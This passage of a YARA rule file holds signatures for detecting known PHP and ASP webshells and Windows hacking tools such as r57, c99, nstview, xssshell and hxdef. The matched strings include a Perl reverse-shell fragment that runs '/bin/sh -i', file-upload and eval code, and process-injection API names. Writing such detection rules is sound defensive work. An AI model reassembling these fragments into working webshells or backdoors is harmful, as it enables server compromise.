\"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<xmp>$out</\" \n      $s1 = \".mm(\\\"Eval PHP code\\\").\" \n   condition: \n      all of them\n}\n\nrule Webshell_FeliksPack3___PHP_Shells_r57_RID34C2 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file r57.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 15:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$sql = \\\"LOAD DATA INFILE \\\\\\\"\\\".$_POST['test3_file'].\" \n   condition: \n      all of them\n}\n\nrule HKTL_HYTop2006_rar_Folder_2006X_RID311D : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2006X.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 13:08:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<input name=\\\"password\\\" type=\\\"password\\\" id=\\\"password\\\"\" \n      $s6 = \"name=\\\"theAction\\\" type=\\\"text\\\" id=\\\"theAction\\\"\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_phvayv_2_RID2FEE : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phvayv.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"rows=\\\"24\\\" cols=\\\"122\\\" wrap=\\\"OFF\\\">XXXX</textarea></font><font\" \n   condition: \n      all of them\n}\n\nrule Webshell_elmaliseker_RID2F34 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file elmaliseker.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"javascript:Command('Download'\" \n      $s5 = \"zombie_array=array(\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_tool_RID2E7D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file tool.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:16:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"\\\"\\\"%windir%\\\\\\\\calc.exe\\\"\\\")\" \n   condition: \n      all of them\n}\n\nrule Webshell_BackDooR__fr__RID2F80 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file BackDooR (fr).php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:59:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"print(\\\"<p align=\\\\\\\"center\\\\\\\"><font size=\\\\\\\"5\\\\\\\">Exploit include \" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_ntdaddy_RID2FA7 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ntdaddy.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:06:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<input type=\\\"text\\\" name=\\\".CMD\\\" size=\\\"45\\\" value=\\\"<%= szCMD %>\\\"> <input type=\\\"s\" \n   condition: \n      all of them\n}\n\nrule Webshell_stview_nstview_RID30B7 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file nstview.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"open STDIN,\\\\\\\"<&X\\\\\\\";open STDOUT,\\\\\\\">&X\\\\\\\";open STDERR,\\\\\\\">&X\\\\\\\";exec(\\\\\\\"/bin/sh -i\\\\\\\");\" \n   condition: \n      all of them\n}\n\nrule Webshell_HYTop_DevPack_upload_RID325B : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file upload.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:01:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<!-- PageUpload Below -->\" \n   condition: \n      all of them\n}\n\nrule HKTL_PasswordReminder_RID2F2C : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file PasswordReminder.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"The encoded password is found at 0x%8.8lx and has a length of %d.\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_RemExp_2_RID2FA1 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file RemExp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:05:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \" Then Response.Write \\\"\" \n      $s3 = \"<a href= \\\"<%=Request.ServerVariables(\\\"script_name\\\")%>\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_c99_RID2D94 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file c99.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:37:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"\\\"txt\\\",\\\"conf\\\",\\\"bat\\\",\\\"sh\\\",\\\"js\\\",\\\"bak\\\",\\\"doc\\\",\\\"log\\\",\\\"sfc\\\",\\\"cfg\\\",\\\"htacce\" \n   condition: \n      all of them\n}\n\nrule HKTL_dbgntboot_RID2C66 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dbgntboot.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp\" \n      $s3 = \"sth junk the M$ Wind0wZ retur\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHP_shell_RID2E05 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:56:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz\" \n      $s11 = \"1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s\" \n   condition: \n      all of them\n}\n\nrule HKTL_hxdef100_RID2B43 : DEMO HKTL T1505_003 T1543_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file hxdef100.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 08:59:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, T1543_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"RtlAnsiStringToUnicodeString\" \n      $s8 = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\\" \n      $s9 = \"\\\\\\\\.\\\\mailslot\\\\hxdef-rk100sABCDEFGH\" \n   condition: \n      all of them\n}\n\nrule HKTL_rdrbs100_RID2B51 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file rdrbs100.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:01:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"Server address must be IP in A.B.C.D format.\" \n      $s4 = \" mapped ports in the list. Currently \" \n   condition: \n      all of them\n}\n\nrule HKTL_hxdef100_2_RID2BD4 : DEMO HKTL T1505_003 T1543_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file hxdef100.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:23:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, T1543_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\\\\\.\\\\mailslot\\\\hxdef-rkc000\" \n      $s2 = \"Shared Components\\\\On Access Scanner\\\\BehaviourBlo\" \n      $s6 = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\\" \n   condition: \n      all of them\n}\n\nrule Simple_PHP_BackDooR_RID2E06 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Simple_PHP_BackDooR_RID2E06.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:56:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he\" \n      $s6 = \"if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn\" \n      $s9 = \"// a simple php backdoor\" \n   condition: \n      1 of them\n}\n\nrule Webshell_HYTop_DevPack_2005Red_RID31B8 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2005Red.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 13:34:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"scrollbar-darkshadow-color:#FF9DBB;\" \n      $s3 = \"echo \\\"&nbsp;<a href=\\\"\\\"/\\\"&encodeForUrl(theHref,false)&\\\"\\\"\\\" target=_blank>\\\"&replace\" \n      $s9 = \"theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\\\"/\\\")),\\\"\\\"),2)\" \n   condition: \n      all of them\n}\n\nrule HKTL_HYTop_CaseSwitch_2005_RID2FEA : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2005.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:17:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"MSComDlg.CommonDialog\" \n      $s2 = \"CommonDialog1\" \n      $s3 = \"__vbaExceptHandler\" \n      $s4 = \"EVENT_SINK_Release\" \n      $s5 = \"EVENT_SINK_AddRef\" \n      $s6 = \"By Marcos\" \n      $s7 = \"EVENT_SINK_QueryInterface\" \n      $s8 = \"MethCallEngine\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_RemExp_RID2F10 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file RemExp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:41:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<td bgcolor=\\\"<%=BgColor%>\\\" title=\\\"<%=SubFolder.Name%>\\\"> <a href= \\\"<%=Request.Ser\" \n      $s5 = \"<td bgcolor=\\\"<%=BgColor%>\\\" title=\\\"<%=File.Name%>\\\"> <a href= \\\"showcode.asp?f=<%=F\" \n      $s6 = \"<td bgcolor=\\\"<%=BgColor%>\\\" align=\\\"right\\\"><%=Attributes(SubFolder.Attributes)%></\" \n   condition: \n      all of them\n}\n\nrule Webshell_FeliksPack3___PHP_Shells_2005_RID34AB : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2005.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 15:40:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"window.open(\\\"\\\"&url&\\\"?id=edit&path=\\\"+sfile+\\\"&op=copy&attrib=\\\"+attrib+\\\"&dpath=\\\"+lp\" \n      $s3 = \"<input name=\\\"dbname\\\" type=\\\"hidden\\\" id=\\\"dbname\\\" value=\\\"<%=request(\\\"dbname\\\")%>\\\">\" \n   condition: \n      all of them\n}\n\nrule Webshell_webadmin_RID2DED : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file webadmin.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:52:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input name=\\\\\\\"editfilename\\\\\\\" type=\\\\\\\"text\\\\\\\" class=\\\\\\\"style1\\\\\\\" value='\\\".$this->inpu\" \n   condition: \n      all of them\n}\n\nrule Webshell_ASP_commands_RID2F3B : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file commands.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"If CheckRecord(\\\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \\\" & VictimID\" \n      $s2 = \"proxyArr = Array (\\\"HTTP_X_FORWARDED_FOR\\\",\\\"HTTP_VIA\\\",\\\"HTTP_CACHE_CONTROL\\\",\\\"HTTP_F\" \n   condition: \n      all of them\n}\n\nrule HKTL_hkdoordll_RID2C66 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file hkdoordll.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is\" \n   condition: \n      all of them\n}\n\nrule HKTL_Mithril_tool_RID2D99 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Mithril.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:38:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"OpenProcess error!\" \n      $s1 = \"WriteProcessMemory error!\" \n      $s4 = \"GetProcAddress error!\" \n      $s5 = \"HHt`HHt\\\\\" \n      $s6 = \"Cmaudi0\" \n      $s7 = \"CreateRemoteThread error!\" \n      $s8 = \"Kernel32\" \n      $s9 = \"VirtualAllocEx error!\" \n   condition: \n      all of them\n}\n\nrule HKTL_Release_dllTest_RID2E9F : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dllTest.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:22:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \";;;Y;`;d;h;l;p;t;x;|;\" \n      $s1 = \"0 0&00060K0R0X0f0l0q0w0\" \n      $s2 = \": :$:(:,:0:4:8:D:`=d=\" \n      $s3 = \"4@5P5T5\\\\5T7\\\\7d7l7t7|7\" \n      $s4 = \"1,121>1C1K1Q1X1^1e1k1s1y1\" \n      $s5 = \"9 9$9(9,9P9X9\\\\9`9d9h9l9p9t9x9|9\" \n      $s6 = \"0)0O0\\\\0a0o0\\\"1E1P1q1\" \n      $s7 = \"<.<I<d<h<l<p<t<x<|<\" \n      $s8 = \"3&31383>3F3Q3X3`3f3w3|3\" \n      $s9 = \"8@;D;H;L;P;T;X;\\\\;a;9=W=z=\" \n   condition: \n      all of them\n}\n\nrule Webshell_r57shell_2_RID2E2D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file r57shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:03:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo \\\"<br>\\\".ws(2).\\\"HDD Free : <b>\\\".view_size($free).\\\"</b> HDD Total : <b>\\\".view_\" \n   condition: \n      all of them\n}\n\nrule HKTL_Mithril_v1_45_dllTest_RID3085 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dllTest.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:43:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"syspath\" \n      $s4 = \"\\\\Mithril\" \n      $s5 = \"--list the services in the computer\" \n   condition: \n      all of them\n}\n\nrule HKTL_dbgiis6cli_RID2C83 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dbgiis6cli.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:52:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\" \n      $s5 = \"###command:(NO more than 100 bytes!)\" \n   condition: \n      all of them\n}\n\nrule Webshell_remview_2003_04_22_RID304F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file remview_2003_04_22.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:34:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"<b>\\\".mm(\\\"Eval PHP code\\\").\\\"</b> (\\\".mm(\\\"don't type\\\").\\\" \\\\\\\"&lt;?\\\\\\\"\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_test_RID2E7F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file test.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$yazi = \\\"test\\\" . \\\"\\\\r\\\\n\\\";\" \n      $s2 = \"fwrite ($fp, \\\"$yazi\\\");\" \n   condition: \n      all of them\n}\n\nrule HKTL_Debug_cress_RID2D09 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file cress.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Mithril \" \n      $s4 = \"Mithril.exe\" \n   condition: \n      all of them\n}\n\nrule Webshell_RhV_webshell_RID2F6B : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file webshell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"RhViRYOzz\" \n      $s1 = \"d\\\\O!jWW\" \n      $s2 = \"bc!jWW\" \n      $s3 = \"0W[&{l\" \n      $s4 = \"[INhQ@\\\\\" \n   condition: \n      all of them\n}\n\nrule Webshell_thelast_index3_RID3045 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file index3.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:32:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"$err = \\\"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\\\\\"Your Name\\\\\\\" field is r\" \n   condition: \n      all of them\n}\n\nrule HKTL_adjustcr_RID2C03 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file adjustcr.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$Info: This file is packed with the UPX executable packer $\" \n      $s2 = \"$License: NRV for UPX is distributed under special license $\" \n      $s6 = \"AdjustCR Carr\" \n      $s7 = \"ION\\\\System\\\\FloatingPo\" \n   condition: \n      all of them\n}\n\nrule Webshell_HYTop_AppPack_2005_RID309F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2005.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:47:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"\\\" onclick=\\\"this.form.sqlStr.value='e:\\\\hytop.mdb\" \n   condition: \n      all of them\n}\n\nrule Webshell_xssshell_RID2E1C : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file xssshell.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:00:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if( !getRequest(COMMANDS_URL + \\\"?v=\\\" + VICTIM + \\\"&r=\\\" + generateID(), \\\"pushComma\" \n   condition: \n      all of them\n}\n\nrule Webshell_FeliksPack3___PHP_Shells_usr_RID353E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file usr.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 16:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_phpinj_RID2F48 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phpinj.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:50:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';\" \n   condition: \n      all of them\n}\n\nrule Webshell_xssshell_db_RID2F41 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file db.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:49:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"'// By Ferruh Mavituna | http://ferruh.mavituna.com\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHP_sh_RID2CC8 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file sh.php\"\n      author = 